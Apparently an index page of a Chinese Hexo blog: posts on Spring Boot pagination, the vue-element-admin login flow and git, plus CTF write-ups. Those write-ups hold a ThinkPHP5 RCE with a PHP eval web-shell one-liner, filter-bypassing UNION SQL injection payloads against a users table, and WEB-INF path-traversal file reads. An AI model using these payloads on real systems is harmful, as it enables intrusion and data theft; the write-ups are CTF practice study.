<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-new-post" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/06/new-post/" class="article-date">
  <time datetime="2020-09-06T09:25:25.000Z" itemprop="datePublished">2020-09-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/06/new-post/">new post</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/09/06/new-post/" data-id="ckeqw4yfq000cj0v9y16wpdh9" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-springboot分页-pageable作参数以及List转换为Page" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/09/06/springboot分页-pageable作参数以及List转换为Page/" class="article-date">
  <time datetime="2020-09-06T09:16:59.861Z" itemprop="datePublished">2020-09-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/09/06/springboot分页-pageable作参数以及List转换为Page/">springboot分页 pageable作参数以及List转换为Page</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Page与Pageable"><a href="#Page与Pageable" class="headerlink" title="Page与Pageable"></a>Page与Pageable</h2><p>Page是spring data jpa提供的一个接口。包含了部分数据集合以及相关的下一部分数据集合以及数据总数等信息。可以获得当前的页面的记录以及总页数和总数据数，以及数据是否能够再分页。</p>
<p>PageImpl是Page接口的实现类。重写了 <code>hashcode(),equals(),toString()</code>方法。</p>
<p>Pageable也是spring data jpa提供的接口，包含了分页的信息，页数getPageNumber()和每页的数据数getPageSzie()。以便JPA通过<br>Pageable得到一个带分页信息的sql语句。PageRequest是Pageable的实现类。提供了排序功能。</p>
<h2 id="使用Page实现分页"><a href="#使用Page实现分页" class="headerlink" title="使用Page实现分页"></a>使用Page实现分页</h2><p>数据库访问层的接口继承<strong>JpaRepository接口</strong>和<strong>JpaSpecificationExecutor接口</strong></p>
<pre><code>public interface UserRepository extends JpaRepository&lt;User, String&gt;,JpaSpecificationExecutor&lt;User&gt; {
    public User findByName(String name);
    @Query(value=&quot;select count(*) from user&quot;,nativeQuery = true)
    public int countUser();
    public User findByUserId(String userId);
    @Modifying
    @Query(value=&quot;update user set password=?1 where user_id=?2&quot;,nativeQuery = true)
    public void updatePassword(String newpassword,String userId);
    @Modifying
    @Query(value=&quot;update user set permission=?1 where user_id=?2&quot;,nativeQuery = true)
    public void updatePermission(String permission,String userId);
}</code></pre><p>这样可以实现Page实现分页查询</p>
<h2 id="定义sql语句中的Pageable参数"><a href="#定义sql语句中的Pageable参数" class="headerlink" title="定义sql语句中的Pageable参数"></a>定义sql语句中的Pageable参数</h2><p>定义Pageable参数使用了Pageable接口的实现类PageRequest。之前的new PageRequest()方式已被弃用。现在使用PageRequest.of来定义Pageable接口的具体内容，如数据为总集合的第几页以及页数。</p>
<pre><code>Pageable pageable;
pageable= PageRequest.of(page,pageSize, Sort.by(Sort.Direction.DESC,&quot;time&quot;));</code></pre><p>这段代码定义了查询数据集的第几页数据以及每页的数据数。并按time属性的倒序排序查询的结果。</p>
<p>@Query定义的sql语句声明pagable参数</p>
<pre><code>@Query(value=&quot;select * from camera where user_id=?1 order by &quot;,nativeQuery = true)
public Page&lt;Camera&gt; findAllByUserId(String userId, Pageable pageable);</code></pre><p>使用#pageable声明pageable参数。</p>
<h2 id="List转换为Page"><a href="#List转换为Page" class="headerlink" title="List转换为Page"></a>List转换为Page<t></t></h2><p>有时数据库操作需要执行动态sql语句，我们可以通过entityManager实现动态sql。但是如果采用entityManager执行访问数据库操作的话，我们需要借助NativeQuery执行sql语句，这样返回的结果一般是List类型的。那么，如何让结果转换为Page类型呢？其实，只需要借助Pageable接口和Page接口的实现PageImpl。</p>
<p>具体的代码如下：</p>
<pre><code>String sql=&quot;select * from &quot;+tableName+&quot; order by time desc&quot;;//&quot; limit &quot;+Integer.toString(page*pageSize)+&quot;,&quot;+Integer.toString(pageSize);
Query nativeQuery=entityManager.createNativeQuery(sql);
List&lt;WeighData&gt; resultList=nativeQuery.getResultList();
int begin= (int) pageable.getOffset();
int en=(begin+pageable.getPageSize())&gt;resultList.size()?resultList.size():(begin+pageable.getPageSize());
return new PageImpl&lt;WeighData&gt;(resultList.subList(begin,en),pageable,resultList.size());</code></pre><p>其中通过getOffset获得这一页的开头在原结果集中的位置，并且通过判断开头的位置加上每页数据数后的结果是否大于最后一个数据在原数据集的位置获取每页的最后数据的位置。(末页的数据数可能不够一个pagesize)，最终获取到一个Page。完成(类似于sql中的limit)分页查询.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/09/06/springboot分页-pageable作参数以及List转换为Page/" data-id="ckeqw4yfu000ej0v9golrt30u" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-vue-element-admin用户登录流程" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/31/vue-element-admin用户登录流程/" class="article-date">
  <time datetime="2020-08-31T14:00:12.687Z" itemprop="datePublished">2020-08-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/31/vue-element-admin用户登录流程/">vue-element-admin用户登录流程</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="1-vue-element-ui简介"><a href="#1-vue-element-ui简介" class="headerlink" title="1.vue-element-ui简介"></a><strong>1.vue-element-ui简介</strong></h2><p>vue-element-ui集成了vue和element-ui框架。 是一个后台前端解决方案，它基于 vue 和 element-ui实现。它使用了最新的前端技术栈，内置了 i18 国际化解决方案，动态路由，权限验证，提炼了典型的业务模型，提供了丰富的功能组件。</p>
<h2 id="2-使用token作为用户凭证"><a href="#2-使用token作为用户凭证" class="headerlink" title="2.使用token作为用户凭证"></a><strong>2.使用token作为用户凭证</strong></h2><p>vue-element-ui使用了token作为用户的登录凭证。token是在服务端产生的用户凭证，产生的token交给前端的用户。基于token的用户验证是无状态的，服务端产生的token本身包含了用户信息。用户每次发送请求到服务端的时候都会携带token信息，在服务端验证后进行操作返回数据。token应该在请求的头部发送，以便实现http请求的无状态。<strong>在vue-element-admin中，发送请求是请求头部中的x-token携带了token信息</strong>。</p>
<p><img src="https://img-blog.csdnimg.cn/20200831202815915.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="3-登录流程介绍"><a href="#3-登录流程介绍" class="headerlink" title="3.登录流程介绍"></a><strong>3.登录流程介绍</strong></h2><p>打开src/views/login/index.vue,可以看到登录按钮绑定了handlelogin函数</p>
<pre><code>this.$store.dispatch(&apos;user/login&apos;, this.loginForm)//store/modules/user.js有login方法
       .then(() =&gt; {
      this.$router.push({ path: this.redirect || &apos;/&apos;, query: this.otherQuery })
          this.loading = false
        })
        .catch(error =&gt; {
          this.$message({
            showClose: true,
            message: error.message,
            type: &apos;error&apos;
          })
          this.loading = false
          this.getCode()
        })</code></pre><p>调用了store/modules/user.js的login方法。看看这个方法有什么</p>
<pre><code>login({ commit }, userInfo) {
    const { username, password } = userInfo
    return new Promise((resolve, reject) =&gt; {
  login({ userName: username.trim(), password: password }).then(response =&gt; {//ESLINT简写方法，response为后台的ajax数据
    console.log(response)
    const data=response
    if(data.token==&apos;&apos;){
      if(data.erinfo===&apos;wrong password&apos;){
        throw new Error(&apos;密码错误&apos;)
      }
      if(data.erinfo===&apos;user not exist&apos;){
        throw new Error(&apos;用户名不存在&apos;)
      }
    }
    commit(&apos;SET_TOKEN&apos;, data.token)
    setToken(data.token)//接受后台数据中的token，否则就抛出异常
    resolve()
  }).catch(error =&gt; {
    reject(error)
    console.log(&apos;k&apos;)
    console.log(error)
  })
})</code></pre><p>  },<br>`</p>
<p>  可以看到登录界面绑定的表单值username(用户名)和password(密码)在这里作为参数。但是我们可以看到这里又调用了一个函数login()，这个函数又是哪里来的 ? store的user.js第一行导入了api下的user.js定义的login方法，这个login方法就是从这里定义的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123; login, logout, getInfo &#125; from &apos;@/api/user&apos;</span><br></pre></td></tr></table></figure>

<p>打开api下的user.js。<strong>api下的js文件提供了vue访问服务端的方法，这些方法导入了request.js包装好的axios实例。因此只需要定义访问服务端资源的请求路径以及请求方式的类型和参数就可以访问服务端的资源</strong>。我们可以修改login方法让他访问服务端。例如：</p>
<pre><code>export function login(data) {
  return request({
    url: &apos;/web/user/confirm&apos;,//访问后台controller层
    method: &apos;post&apos;,
    data:data
  })
}</code></pre><p>后台controller层的对应方法(使用springMVC)</p>
<pre><code>@PostMapping(value = &quot;/confirm&quot;)
@ResponseBody
public Map&lt;String, Object&gt; confirm(@RequestBody User user) {
    Map &lt;String,Object&gt;map = new HashMap&lt;String, Object&gt;();
    User userdb=this.userManager.findByUserName(user.getUserName());
    if(userdb==null) {
        map.put(&quot;token&quot;, &quot;&quot;);
        map.put(&quot;erinfo&quot;,&quot;user not exist&quot;);
        return map;
    }
    else if(!userdb.getPassword().equals(encryptPassword(userdb.getSecret(), user.getPassword()))) {
        map.put(&quot;token&quot;, &quot;&quot;);
        map.put(&quot;erinfo&quot;, &quot;wrong password&quot;);
        return map;
    }
    String token = TokenUtil.generateToken(user.getUserName(), user.getPassword());
    map.put(&quot;token&quot;, token);
    return map;
}</code></pre><p>前文提到的token就是在这里生成的，这里使用json web token。返回的token将会被vuex储存到cookie里。如果后台验证成功，返回的JSON数据会先交给store/user.js中被导入的login方法处理，如果得到的token不为空，则设置该token为用户的凭证，之后的请求都会用到这个token。如果为空，则抛出异常。抛出的异常在store/user.js下的login方法再抛出到index.vue下的方法。<br>回到views下的index.vue中的handlelogin。看到代码可以知道如果登录验证通过(调用的没有抛出异常)，则进行路由跳转。否则页面提示错误信息(没有通过后端的验证)。这样就完成了一次登录流程，用户通过验证后就可以浏览页面了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/08/31/vue-element-admin用户登录流程/" data-id="ckeqw4yfw000gj0v9em7hhttq" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-git版本回退提交操作" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/05/13/git版本回退提交操作/" class="article-date">
  <time datetime="2020-05-13T14:43:43.283Z" itemprop="datePublished">2020-05-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="git版本回退以及提交操作"><a href="#git版本回退以及提交操作" class="headerlink" title="git版本回退以及提交操作"></a>git版本回退以及提交操作</h1><hr>
<p>###1.git pull后发现问题</p>
<p>今天pull下来git上的项目文件，发现pom和一些文件被组员整理项目结构时不小心删了。感觉如果再重新写有点耗时间。打算利用git的版本回退功能，去找回原来的文件。</p>
<hr>
<p>###2.使用git log命令</p>
<p>打开git控制台输入’git log’查看以前的提交记录。输入<code>git reset --hard commit id(hash)</code>回退。或者使用tortoisegit选择’show log’,选择之前的版本右键’reset master to this’去回退。</p>
<p>reset的三个参数：</p>
<pre><code>soft 仅移动head指针，不对工作区和暂存区操作
mixed 改变head指针，工作区但不改变暂存区内容
hard head指针，工作区，暂存区内容都改变</code></pre><p>版本回退到指定的版本，上一版本可以为HEAD^。发现需要merge。否则重新push到远程库时会提示’non-fast-forward’</p>
<hr>
<p>###3.解决git push non-fast-forward</p>
<p>出现这个问题，我的解决方法是 <code>git pull origin master --force</code>意思是直接替代remote的内容。发现可以成功提交。但事后了解这种方式适用于改动不大时的提交。更合适的方法是先pull下来最新的版本，在本地合并。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/05/13/git版本回退提交操作/" data-id="ckeqw4yf40005j0v9l4egb05a" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-BUUCTF-old-hack" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/26/BUUCTF-old-hack/" class="article-date">
  <time datetime="2020-04-26T11:25:37.220Z" itemprop="datePublished">2020-04-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/26/BUUCTF-old-hack/">BUUCTF old hack</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#[BUUCTF] old hack</p>
<hr>
<p><strong>1.打开页面，获取提示信息</strong></p>
<p>打开页面，页面提示powered by Thinkphp。说明可能和thinkphp框架有关。也确实如此，这里用到了thinkphp5的远程命令执行漏洞。在用这个thinkphp的漏洞前，先了解一下有关thinkphp的一些基础知识:</p>
<p>thinkphp是一个用来简化企业应用开发和敏捷WEB应用的php框架。thinkphp包含了底层架构、兼容处理、基类库、数据库访问层、模板引擎、缓存机制、插件机制、角色认证、表单处理等常用的组件。简而言之，thinkphp是一个用来简化php网站开发的框架，让开发者更注重于业务逻辑。</p>
<p><img src="https://img-blog.csdnimg.cn/20200426175644953.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<hr>
<p><strong>2.thinkphp5远程命令执行漏洞</strong></p>
<p>漏洞描述：由于thinkphp对框架中的核心Requests类的方法method方法提供了表单请求伪造，该功能利用 <code>$_POST[&#39;_method&#39;]</code>来传递真实的请求方法。但由于框架没有对参数进行验证，导致攻击者可以设置<code>$_POST[&#39;_method&#39;]=&#39;__construct&#39;</code>而让该类的变量被覆盖。攻击者利用该方式将filter变量覆盖为system等函数名，当内部进行参数过滤时便会进行执行任意命令。</p>
<p>使用kali查找一下漏洞的利用方法：</p>
<p>1.<code>searchsploit thinkphp</code> 查找thinkphp相关的漏洞</p>
<p><img src="https://img-blog.csdnimg.cn/20200426175658860.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>2.<code>cd usr/share/exploitdb/exploits/php/webapp/46150.txt</code> 查看漏洞的利用方法</p>
<p><img src="https://img-blog.csdnimg.cn/20200426175709668.JPG" alt></p>
<p>3.post传参，发现页面提示flag在路径下存放</p>
<p><img src="https://img-blog.csdnimg.cn/20200426175926466.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p><img src="https://img-blog.csdnimg.cn/20200426175850451.JPG" alt></p>
<p>4.把<code>ls /</code>换成<code>cat /flag</code>,获得最后的flag</p>
<p>5.提交flag</p>
<h2 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/20200426175945856.JPG" alt></h2><p><strong>3.漏洞复现</strong></p>
<p>下载thinkphp5.0.22: <a href="http://www.thinkphp.cn/donate/download/id/1260.html" target="_blank" rel="noopener">http://www.thinkphp.cn/donate/download/id/1260.html</a></p>
<p>通过phpstudy搭建环境，解压文件到WWW目录下</p>
<p>访问：localhost/thinkphp5.0.22/public</p>
<p>post传参 这里可以换成<code>echo 233</code>测试一下</p>
<p><img src="https://img-blog.csdnimg.cn/20200426175958959.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>写入shell 换成 <code>echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt;shell.php</code></p>
<p>可以看到成功写入shell，用菜刀连接试试。能连上，说明写入shell成功了</p>
<p><img src="https://img-blog.csdnimg.cn/20200426180016596.JPG" alt></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/04/26/BUUCTF-old-hack/" data-id="ckeqw4yf00002j0v9iyf20nfo" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-RoarCTF2019-easy-Java" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/26/RoarCTF2019-easy-Java/" class="article-date">
  <time datetime="2020-04-26T11:21:58.538Z" itemprop="datePublished">2020-04-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/26/RoarCTF2019-easy-Java/">RoarCTF2019 easy Java</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Roar-CTF-2019-easy-Java"><a href="#Roar-CTF-2019-easy-Java" class="headerlink" title="[Roar CTF  2019] easy Java"></a>[Roar CTF  2019] easy Java</h1><hr>
<p><strong>1.尝试登录</strong></p>
<p>打开实例，首先出现了一个登录页面。考虑账号用admin，密码先尝试几个登录。提示wrong password，但是，这个页面的密码可以直接用暴力破解的方法得到。得出来用户名是admin，密码是admin888。</p>
<p>登录过去发现页面”flag is not here”,页面没有啥有用的信息，回到登录页面，发现有个help链接。进去，发先报错 “java.io.FileNotFoundException:{help.docx}”,意思是找不到help.docx这个文件。感觉这个提示没啥用，但既然提示这个文件，而且页面的URL是Download?file=help.docx。那就尝试下载help.docx这个文件。但是不知为何，get请求无法下载文件，只能通过post请求下载。</p>
<h2 id><a href="#" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/20200426175300859.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></h2><p><strong>2.寻找正确的文件</strong></p>
<p>打开help.docx结果没有什么有用的信息，不过我们可以判断这里是有文件包含漏洞的，这里需要找到合适文件。题目名已经告诉我们，这里可能和Java有关。这里就要用到Java web的有关知识了，这里需要了解一下Java web的文件结构：</p>
<pre><code>src/main/java: 这个目录一般是存放web项目的Java源文件的
src/main/resource: 这个目录一般是存放相关的配置文件
src/main/webapp: 这个目录一般是和web应用相关的
webapp下的文件目录是容易出现安全问题的
/WEB-INF/web.xml: Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则 
/WEB-INF/classes/：含了站点所有用的 class 文件(即编译后的Java文件)，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
/WEB-INF/database.properties：数据库配置文件</code></pre><p>这里就要尝试打开web.xml文件了。web.xml是我们需要研究的文件。之所以会发生安全漏洞就是因为如果在web.xml文件中有某个文件的相关映射的话，我们就可以直接在页面访问这个文件，就类似于文件包含了。从而发生安全漏洞。</p>
<hr>
<p><strong>3找到flag</strong></p>
<p>通过post请求下载web.xml文件 <code>payload：Download?filename=/WEB-INF/web.xml</code></p>
<p><img src="https://img-blog.csdnimg.cn/20200426175514555.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
 xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
 xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
 version=&quot;4.0&quot;&gt;

&lt;welcome-file-list&gt;
&lt;welcome-file&gt;Index&lt;/welcome-file&gt;
&lt;/welcome-file-list&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.IndexController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;IndexController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Index&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.LoginController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;LoginController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Login&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.DownloadController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;DownloadController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Download&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet&gt;
&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
&lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;
&lt;/servlet&gt;
&lt;servlet-mapping&gt;
&lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;
&lt;url-pattern&gt;/Flag&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;/web-app&gt;</code></pre><p>可以看到有个servlet（运行在web服务器或应用服务器上的程序）为FlagController,这个是可能有flag的类，存放于com.wm.ctf包下。那么尝试下载这个类。构造payload：<code>Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code>(直接这样是不行，因为无法get请求。需要在Download页面下post请求传filename=/WEB-INF/classes/com/wm/ctf/FlagController.class)</p>
<p>打开class，发现一串有点像Base64编码的字符串</p>
<p><img src="https://img-blog.csdnimg.cn/20200426175527989.JPG" alt></p>
<p>尝试一下Basse64解码，成功的得到了flag</p>
<p><img src="https://img-blog.csdnimg.cn/2020042617553933.JPG" alt></p>
<p>提交flag</p>
<p>这个题目其实结合了源码泄露，和文件包含以及Java web的基础知识。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/04/26/RoarCTF2019-easy-Java/" data-id="ckeqw4yew0001j0v9tuck45b0" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-SWPUCTF2019 web1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/25/SWPUCTF2019 web1/" class="article-date">
  <time datetime="2020-04-25T10:17:34.015Z" itemprop="datePublished">2020-04-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#[SWPUCTF 2019] web1</p>
<hr>
<p><strong>1.登录页面</strong></p>
<p>进来首先是个登录页面，一开始尝试用admin登录并用暴力破解得出密码，但是好像破解不出密码。看到下面有个注册页面，点开注册一个账号就可以登录了。登录后，点开广告申请，发现有点不对劲。一开始看到文本框，想到了xss,试过几个xss payload，发现应该和xss无关。。。想到sql注入，但不知道怎么构造绕过的payload。看了网上大佬的WP，学到了sql注入的新姿势，原来这是利用了无列名注入。</p>
<hr>
<p><strong>2.构造payload</strong></p>
<p>随便试了几个payload,发现order,and,or都被过滤了。空格也被过滤了。。。但是空格可以用/**/代替。and也可以用&amp;&amp;代替。那么先试试有几个字段。由于order被过滤了，没法用order by子句判断目标表的列数了。这里我就逐渐增加字段数，这样慢慢的发现竟然有22个字段,并且第2，3列是显示列</p>
<pre><code>-1&apos;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>接下来就是老套路，查表，查列，查数据了。</p>
<p>首先爆数据库名，数据库名为web1</p>
<pre><code>-1&apos;/**/union/**/select/**/1,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>接下来爆表名</p>
<pre><code>-1&apos;/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&apos;web1&apos;/**/,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>但是information被过滤了，实际上是or被过滤了，导致order，or，information这些字都被过滤了。那怎么查到表名？在网上搜索才知道mysql在5.7版本之后还有一个sys系统表sys.schema_auto_increment_columns，作用和information_schema是相似的。</p>
<pre><code>-1&apos;/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns /**/where/**/table_schema=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;</code></pre><p>但是试了一下报错,页面说sys.schema_auto_increment_columns这个表不存在。但是根据刚才试列数是页面报的错才知道mysql.innodb_table_stats这个表也可以用，也类似于information_schema,这是这个表的详细使用信息：</p>
<p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/" target="_blank" rel="noopener">https://mariadb.com/kb/en/mysqlinnodb_table_stats/</a></p>
<p>那么重新构造payload：</p>
<pre><code>-1&apos;/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;</code></pre><p>查到有两个表ads,users。ads应该是和广告有关的，这里先试试users表</p>
<pre><code>-1&apos;/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&amp;&amp;/**/&apos;1&apos;=&apos;1</code></pre><p>这里用到了子查询，子查询是将一个查询语句嵌套在另一个查询语句中，在特定的情况下，一个查询语句的条件需要另一个查询语句来获取，内层查询语句的查询结果，可以为外层查询语句提供查询条件。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/04/25/SWPUCTF2019 web1/" data-id="ckeqw4yf30004j0v90z44j91u" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-JPA初学问题总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/13/JPA初学问题总结/" class="article-date">
  <time datetime="2020-04-13T13:04:54.234Z" itemprop="datePublished">2020-04-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="JPA初学问题总结"><a href="#JPA初学问题总结" class="headerlink" title="JPA初学问题总结"></a>JPA初学问题总结</h1><hr>
<p><strong>1.IDE无法解析junit和spring framework-test</strong></p>
<p>  创建实体DAO的测试类时，按往常一样导入junit和spring framework-test的依赖。但是发现在测试类中导入相关的类时发现eclipse报错’cannot reslove …’，一开始纳闷导入的类都是正确的，为什么eclipse无法解析？原来是需要如下这样在项目的pom.xml文件中导入依赖</p>
<!-- ============== test begin ============== -->
<pre><code>&lt;dependency&gt;&lt;!-- JUnit单元测试框架 --&gt;
    &lt;groupId&gt;junit&lt;/groupId&gt;
